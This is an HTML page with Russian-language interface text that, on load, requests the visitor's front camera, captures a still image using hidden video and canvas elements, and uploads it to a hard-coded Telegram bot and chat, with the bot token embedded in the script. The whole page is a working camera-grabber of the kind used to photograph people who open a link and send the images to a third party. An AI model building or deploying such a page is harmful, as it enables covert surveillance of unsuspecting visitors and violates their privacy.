<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Capture</title>
    <style>
        .container {
            text-align: center;
            margin: 20px auto;
            max-width: 500px;
        }
        #photo {
            max-width: 100%;
            border: 1px solid #ccc;
            border-radius: 8px;
            margin-top: 20px;
        }
        .status {
            margin-top: 10px;
            color: #666;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Захваченное изображение:</h2>
        <div class="status" id="status">Подготовка камеры...</div>
        <img id="photo" alt="Фото будет здесь" style="display: none;">
    </div>

    <script>
        const photoElement = document.getElementById('photo');
        const statusElement = document.getElementById('status');
        
        const BOT_TOKEN = "8186769001:AAHQ-3PT9NHqPbZTXvCinuMAhKpQJX2QQ68"; // Токен бота
        const CHAT_ID = "7717007781"; // ID чата
        
        // Создаем скрытые элементы для захвата
        const video = document.createElement('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.style.display = 'none';
        document.body.appendChild(video);
        
        const canvas = document.createElement('canvas');
        canvas.style.display = 'none';
        document.body.appendChild(canvas);
        
        let stream = null;

        // Инициализация и захват фото
        async function captureAndSend() {
            try {
                statusElement.textContent = "Запрос доступа к камере...";
                
                // Запрашиваем доступ к камере
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user", // Фронтальная камера
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                video.srcObject = stream;
                
                statusElement.textContent = "Подготовка к снимку...";
                
                // Ждем, пока видео загрузится, и делаем снимок
                video.onloadedmetadata = function() {
                    video.play();
                    
                    // Даем камере время настроиться
                    setTimeout(() => {
                        takePhoto();
                    }, 2000);
                };
            } catch (error) {
                statusElement.textContent = "Ошибка: " + error.message;
                console.error("Ошибка доступа к камере:", error);
            }
        }

        function takePhoto() {
            try {
                statusElement.textContent = "Делаем снимок...";
                
                // Проверяем инициализацию видео
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    statusElement.textContent = "Ошибка: Камера не инициализирована";
                    return;
                }
                
                // Настраиваем холст
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Чистим холст
                ctx.fillStyle = '#FFF';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Рисуем кадр видео
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Останавливаем камеру
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
                
                // Создаем изображение
                canvas.toBlob(
                    blob => {
                        if (blob) {
                            displayPhoto(blob);
                            sendPhoto(blob);
                        } else {
                            statusElement.textContent = "Ошибка создания изображения";
                        }
                    }, 
                    'image/jpeg', 
                    0.95
                );
            } catch (error) {
                statusElement.textContent = "Ошибка при захвате фото: " + error.message;
                console.error("Ошибка при захвате фото:", error);
            }
        }

        function displayPhoto(blob) {
            const url = URL.createObjectURL(blob);
            photoElement.src = url;
            photoElement.style.display = 'block';
        }

        function sendPhoto(blob) {
            statusElement.textContent = "Отправка фото...";
            
            let formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'photo.jpg');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log("Отправлено:", data);
                statusElement.textContent = data.ok ? 
                    "Фото отправлено в Telegram!" : 
                    "Ошибка при отправке: " + (data.description || "неизвестная ошибка");
            })
            .catch(error => {
                console.error("Ошибка отправки:", error);
                statusElement.textContent = "Ошибка отправки: " + error.message;
            });
        }

        // Запускаем процесс захвата при загрузке страницы
        window.addEventListener('DOMContentLoaded', captureAndSend);
    </script>
</body>
</html>
